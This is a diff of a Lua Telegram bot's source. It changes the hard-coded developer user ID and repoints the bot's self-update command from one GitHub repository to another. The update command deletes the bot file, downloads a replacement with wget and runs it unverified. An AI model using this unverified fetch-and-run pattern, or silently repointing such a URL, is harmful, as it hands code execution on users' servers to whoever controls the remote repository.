@@ -254,7 +254,7 @@ return var
 end 
 
 function Rutba(user_id,chat_id)
-if tonumber(user_id) == tonumber(554921096) then  
+if tonumber(user_id) == tonumber(711575912) then  
 var = 'مطور السورس👨‍🔧'
 elseif tonumber(user_id) == tonumber(SUDO) then
 var = 'المطور الاساسي👨‍💻'  
@@ -874,7 +874,7 @@ end
 
 if text == 'تحديث السورس ™' and SudoBot(msg) then 
 os.execute('rm -rf BOYKA.lua')
-os.execute('wget https://raw.githubusercontent.com/BOYKATEAM/BOYKA/master/BOYKA.lua')
+os.execute('wget https://raw.githubusercontent.com/LOFYBOT/LOFY/master/BOYKA.lua')
 send(msg.chat_id_, msg.id_,'🔭| تم تحديث البوت \n📮| لديك اخر اصدار سورس بويكا\n📡| الاصدار ← { 1.2v}')
 dofile('BOYKA.lua')  
 end
